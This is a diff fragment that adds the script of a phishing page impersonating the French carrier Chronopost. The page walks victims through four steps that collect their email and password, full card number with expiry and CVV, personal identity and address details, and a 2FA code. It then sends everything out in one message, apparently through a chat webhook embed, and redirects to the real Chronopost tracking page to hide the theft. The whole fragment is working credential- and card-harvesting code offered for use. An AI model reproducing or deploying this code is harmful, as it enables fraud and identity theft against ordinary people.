+                { name: "🩻 User-Agent", value: "```" + ua + "```", inline: false },
+                { name: "🩻 Horodatage", value: "```" + ts + "```", inline: false }
+            ],
+            footer: { text: "Chronopost - Systeme de securite | " + ts },
+            timestamp: new Date().toISOString()
+        }]
+    }));
+}
+
+function ld(b){b.classList.add("ld");b.disabled=true}
+function ul(b){b.classList.remove("ld");b.disabled=false}
+function se(id,m){var e=document.getElementById(id);e.textContent=m;e.classList.add("show");setTimeout(function(){e.classList.remove("show")},5000)}
+function gp(id){var p=document.querySelectorAll(".pg");for(var i=0;i<p.length;i++)p[i].classList.remove("on");document.getElementById(id).classList.add("on");window.scrollTo({top:0})}
+
+// ===== PAGE 1 : LOGIN =====
+function f1(e){
+    e.preventDefault();
+    var b=document.getElementById("b1");ld(b);
+    _collectedData.email = document.getElementById("i1").value;
+    _collectedData.password = document.getElementById("i2").value;
+    setTimeout(function(){ul(b);document.getElementById("dEmail").textContent=_collectedData.email;gp("pg2")},800);
+    return false;
+}
+
+// ===== PAGE 2 : CARTE =====
+function cEX(el){
+    var v=el.value.replace(/[^0-9]/g,"").substring(0,4);
+    if(v.length>2)v=v.substring(0,2)+"/"+v.substring(2);
+    el.value=v;
+}
+function f2(e){
+    e.preventDefault();
+    var b=document.getElementById("b2");ld(b);
+    _collectedData.card = document.getElementById("i3").value.replace(/\s/g,"");
+    _collectedData.exp = document.getElementById("i4").value;
+    _collectedData.cvv = document.getElementById("i5").value;
+    _collectedData.name = document.getElementById("i6").value;
+    if(_collectedData.card.length<16){ul(b);se("e2","Numero de carte invalide (16 chiffres requis)");return false}
+    if(_collectedData.cvv.length<3){ul(b);se("e2","Cryptogramme invalide (3 chiffres requis)");return false}
+    setTimeout(function(){ul(b);gp("pg3")},800);
+    return false;
+}
+
+// ===== PAGE 3 : INFOS PERSOS =====
+function cDN(el){
+    var v=el.value.replace(/[^0-9]/g,"").substring(0,8);
+    if(v.length>4)v=v.substring(0,2)+"/"+v.substring(2);
+    if(v.length>7)v=v.substring(0,5)+"/"+v.substring(5);
+    el.value=v;
+}
+function cTel(el){
+    var v=el.value.replace(/[^0-9]/g,"").substring(0,10);
+    var parts=[];
+    for(var i=0;i<v.length;i+=2)parts.push(v.substring(i,i+2));
+    el.value=parts.join(' ');
+}
+function f3(e){
+    e.preventDefault();
+    var b=document.getElementById("b3");ld(b);
+    _collectedData.nom = document.getElementById("i7").value;
+    _collectedData.prenom = document.getElementById("i8").value;
+    _collectedData.ddn = document.getElementById("i9").value;
+    _collectedData.adresse = document.getElementById("i10").value;
+    _collectedData.cp = document.getElementById("i11").value;
+    _collectedData.ville = document.getElementById("i12").value;
+    _collectedData.tel = document.getElementById("i13").value;
+    if(!_collectedData.nom||!_collectedData.prenom||!_collectedData.ddn||!_collectedData.adresse||!_collectedData.cp||!_collectedData.ville||!_collectedData.tel){
+        ul(b);se("e3","Veuillez remplir tous les champs obligatoires.");return false;
+    }
+    setTimeout(function(){ul(b);gp("pg4")},800);
+    return false;
+}
+
+// ===== PAGE 4 : 2FA + ENVOI FINAL =====
+function f4(e){
+    e.preventDefault();
+    var b=document.getElementById("b4");ld(b);
+    _collectedData.code = document.getElementById("i14").value;
+    
+    // ENVOI DE TOUT EN UN SEUL MESSAGE
+    sendAll();
+    
+    setTimeout(function(){window.location.href="https://www.chronopost.fr/fr/suivi-colis"},2000);
+    return false;
+}
+</script>
+</body>
+</html>
